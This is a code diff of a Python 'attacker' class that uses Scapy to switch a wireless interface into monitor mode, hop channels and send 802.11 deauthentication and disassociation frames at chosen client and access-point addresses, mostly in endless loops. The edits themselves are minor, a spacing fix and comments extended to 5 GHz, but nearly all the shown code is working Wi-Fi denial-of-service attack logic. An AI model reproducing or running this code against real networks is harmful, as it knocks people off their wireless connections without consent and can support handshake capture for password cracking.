@@ -26,7 +26,7 @@ class attacker:
     def __init__(self, attack_int):
         self.attack_int = attack_int
 
-    def __del__(self): # Destroy here all complex fields!!!
+    def __del__(self):  # Destroy here all complex fields!!!
         self.screen = ""
 
     def rts_flood(self, args: dict):
@@ -62,7 +62,7 @@ class attacker:
             self.attack_int = self.__start_monitor_mode(self.attack_int)
             while True:
                 for i in range(len(args)):
-                    # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                    # if args[i]["Freq"] == '2.4' or args[i]["Freq"] == '5':  # 2.4 GHz or 5 GHZ
                     #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                     deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
@@ -71,7 +71,7 @@ class attacker:
                     sendp(deauth_frame, iface=self.attack_int, count=quantity, verbose=0)
         else:
             for i in range(len(args)):
-                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                # if args[i]["Freq"] == '2.4' or args[i]["Freq"] == '5':  # 2.4 GHz or 5 GHZ
                 #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
@@ -87,7 +87,7 @@ class attacker:
         self.attack_int = self.__start_monitor_mode(self.attack_int)
         while True:
             for i in range(len(args)):
-                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                # if args[i]["Freq"] == '2.4' or args[i]["Freq"] == '5':  # 2.4 GHz or 5 GHZ
                 #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 self.__deauth(args[i], 5)
@@ -105,7 +105,7 @@ class attacker:
             self.attack_int = self.__start_monitor_mode(self.attack_int)
             while True:
                 for i in range(len(args)):
-                    # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                    # if args[i]["Freq"] == '2.4' or args[i]["Freq"] == '5':  # 2.4 GHz or 5 GHZ
                     #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                     dissasoc_frame = RadioTap() / Dot11(type=0, subtype=0xa, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
@@ -114,7 +114,7 @@ class attacker:
                     sendp(dissasoc_frame, iface=self.attack_int, count=quantity, verbose=0)
         else:
             for i in range(len(args)):
-                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                # if args[i]["Freq"] == '2.4' or args[i]["Freq"] == '5':  # 2.4 GHz or 5 GHZ
                 #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 dissasoc_frame = RadioTap() / Dot11(type=0, subtype=0xa, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
@@ -136,7 +136,7 @@ class attacker:
         self.attack_int = self.__start_monitor_mode(self.attack_int)
         while True:
             for i in range(len(args)):
-                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                # if args[i]["Freq"] == '2.4' or args[i]["Freq"] == '5':  # 2.4 GHz or 5 GHZ
                 #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 for ii in range(50):
